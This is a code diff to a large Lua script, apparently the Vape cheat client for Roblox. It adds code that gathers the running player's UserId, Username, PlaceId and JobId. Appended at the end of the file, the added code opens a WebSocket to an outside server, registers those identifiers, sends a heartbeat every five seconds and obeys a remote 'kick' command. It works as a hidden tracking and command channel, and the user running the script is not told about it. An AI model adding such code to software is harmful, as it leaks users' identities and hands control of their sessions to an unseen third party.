@@ -3,6 +3,15 @@
 -- create commit
 --writefile('newlunar/profiles/commit.txt', 'a1a647c8475611d0acfd2068bf8f6a0453ae7615')
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+
+local PlaceId = game.PlaceId
+local JobId = game.JobId
+local UserId = Player.UserId
+local Username = Player.Name
+
 local libraries = {
 	drawing = function(...)
 		if not get_comm_channel or not create_comm_channel then
@@ -26232,4 +26241,46 @@ if not shared.VapeIndependent then
 else
 	vape.Init = finishLoading
 	return vape
+end
+
+
+local success, socket = pcall(function()
+    return WebSocket.connect("wss://testthing-production.up.railway.app/")
+end)
+
+if success and socket then
+    print("✅ Connected to WebSocket server!")
+
+    -- Send registration only once
+    socket:Send(HttpService:JSONEncode({
+        command = "RegisterClient",
+        data = { PlaceId = PlaceId, JobId = JobId, UserId = UserId, Username = Username }
+    }))
+
+    -- Command handlers
+    local commands = {}
+    commands["kick"] = function(args)
+        if args.targetUserId == UserId or args.targetUsername == Username then
+            Player:Kick(args.reason or "No reason provided")
+        end
+    end
+
+    socket.OnMessage:Connect(function(message)
+        local decoded = HttpService:JSONDecode(message)
+        if decoded.command and commands[decoded.command] then
+            commands[decoded.command](decoded.args)
+        else
+            print("📨 Received:", decoded.response or message)
+        end
+    end)
+
+    -- Heartbeat ping every 5 seconds
+    task.spawn(function()
+        while true do
+            task.wait(5)
+            socket:Send(HttpService:JSONEncode({ command = "ping" }))
+        end
+    end)
+else
+    warn("Failed to connect to WS")
 end
